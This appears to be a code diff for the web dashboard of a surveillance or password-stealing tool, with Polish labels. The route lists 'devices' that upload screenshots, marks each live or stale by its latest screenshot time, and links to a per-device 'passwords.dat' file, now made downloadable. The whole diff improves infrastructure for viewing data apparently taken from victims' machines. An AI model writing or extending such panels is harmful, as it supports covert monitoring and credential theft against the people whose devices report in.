@@ -20,24 +20,29 @@ def index():
         folder = os.path.join(UPLOAD_FOLDER, u)
         files = sorted(os.listdir(folder))
         has_passwords = os.path.exists(os.path.join(folder, "passwords.dat"))
+
         if not files:
             device_list.append((u, "🔴", "brak plików", has_passwords))
             continue
-        ...
-        device_list.append((u, "🟢", timestamp.strftime("%H:%M:%S"), has_passwords))
-
-        else:
-                device_list.append((u, "🔴", timestamp.strftime("%H:%M:%S")))
+        latest = files[-1]
+        timestamp_str = latest.replace("screenshot_", "").replace(".png", "")
+        try:
+            timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d_%H-%M-%S")
+            timestamp += datetime.timedelta(hours=2)
+            diff = (now - timestamp).total_seconds()
+            if diff < 60:
+                device_list.append((u, "🟢", timestamp.strftime("%H:%M:%S"), has_passwords))
+            else:
+                device_list.append((u, "🔴", timestamp.strftime("%H:%M:%S"), has_passwords))
         except:
-            device_list.append((u, "🔴", "błąd daty"))
+            device_list.append((u, "🔴", "błąd daty", has_passwords))
 
     content = f"<h1>Urządzenia: {len(device_list)}</h1><ul>"
     for u, status, t, has_passwords in device_list:
-    content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
-    if has_passwords:
-        content += f' | <a href="/screens/{u}/passwords.dat" target="_blank">🔐 Hasła</a>'
-    content += '</li>'
-
+        content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
+        if has_passwords:
+            content += f' | <a href="/screens/{u}/passwords.dat" download>🔐 Hasła</a>'
+        content += '</li>'
     content += "</ul>"
     return content
 
